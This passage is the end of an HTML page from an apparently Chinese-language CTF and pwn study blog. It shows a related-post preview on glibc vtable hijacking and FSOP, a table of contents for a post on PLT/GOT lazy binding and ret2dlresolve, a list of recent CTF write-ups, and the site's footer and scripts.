*(fp-&gt;_wide_data-&gt;_wide_vtable +...</div></div></div></a><a class="pagination-related" href="/2025/07/27/%E5%8A%AB%E6%8C%81vtable%E4%BB%A5%E5%8F%8AFSOP/" title="劫持vtable以及FSOP"><img class="cover" src="/img/dio.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-27</div><div class="info-item-2">劫持vtable以及FSOP</div></div><div class="info-2"><div class="info-item-1">0x00参考博客IO FILE 之劫持vtable及FSOP-先知社区【我的 PWN 学习手札】IO_FILE 之 FSOP_fsop pwn-CSDN博客【我的 PWN 学习手札】IO_FILE 之 劫持vtable到_IO_str_jumps_pwn vtable-CSDN博客linux IO_FILE 利用_io list all结构体-CSDN博客因为vtable check机制的引入，直接劫持vtable和简单的FSOP在glibc2.24+就已经失效了，如下 123456789101112131415161718#define _IO_MAGIC_MASK     0xFFFF0000static inline const struct _IO_jump_t *IO_validate_vtable(const struct _IO_jump_t *vtable){  uintptr_t ptr = (uintptr_t) vtable;  uintptr_t offset = ptr - (uintptr_t) &amp;__io_vtables;  if...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Rick.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">r3t2</div><div class="author-info-description">on the way</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fuckth3w0r1d"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">I am learning...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B-PLT%E4%B8%8EGOT"><span class="toc-number">2.</span> <span class="toc-text">0x01 延迟绑定流程 PLT与GOT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%B5%81%E7%A8%8B"><span class="toc-number">2.0.1.</span> <span class="toc-text">延迟绑定流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PLT%EF%BC%88-plt-plt-sec%EF%BC%89"><span class="toc-number">2.0.2.</span> <span class="toc-text">PLT（.plt/.plt.sec）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GOT-%EF%BC%88-got-got-plt%EF%BC%89"><span class="toc-number">2.0.3.</span> <span class="toc-text">GOT （.got/.got.plt）</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-dl-runtime-resolve%E5%87%BD%E6%95%B0"><span class="toc-number">3.</span> <span class="toc-text">0x02 _dl_runtime_resolve函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="toc-number">3.0.1.</span> <span class="toc-text">相关结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">源码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ret2dlresolve"><span class="toc-number">4.</span> <span class="toc-text">0x03 ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Notion"><span class="toc-number">4.0.1.</span> <span class="toc-text">Notion</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">4.0.2.</span> <span class="toc-text">NO RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PARTIAL-RELRO"><span class="toc-number">4.0.3.</span> <span class="toc-text">PARTIAL RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FULL-RELRO"><span class="toc-number">4.0.4.</span> <span class="toc-text">FULL RELRO</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwntools%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">4.0.5.</span> <span class="toc-text">pwntools一把梭</span></a></li></ol></li></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/WHUSESC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%80%83%E7%BA%B2%E7%AE%97%E6%B3%95%E6%A8%A1%E7%89%88/" title="WHUSESC数据结构考纲算法模版">WHUSESC数据结构考纲算法模版</a><time datetime="2025-12-23T12:43:36.000Z" title="发表于 2025-12-23 20:43:36">2025-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/22/WHUSESC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C%E5%BE%80%E5%B9%B4%E9%A2%98%E8%A7%A3/" title="WHUSESC数据结构实验往年题解">WHUSESC数据结构实验往年题解</a><time datetime="2025-12-22T14:35:29.000Z" title="发表于 2025-12-22 22:35:29">2025-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/07/DASCTF2025-winter/" title="DASCTF2025-winter">DASCTF2025-winter</a><time datetime="2025-12-07T06:32:14.000Z" title="发表于 2025-12-07 14:32:14">2025-12-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/20/OCCTF2025/" title="OCCTF2025">OCCTF2025</a><time datetime="2025-11-20T12:08:26.000Z" title="发表于 2025-11-20 20:08:26">2025-11-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/20/RCTF2025/" title="RCTF2025">RCTF2025</a><time datetime="2025-11-20T08:45:20.000Z" title="发表于 2025-11-20 16:45:20">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2025 By r3t2</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Hello,World" data-fontsize="15px" data-random="false" async="async"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="天青色等烟雨，而我在等你" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>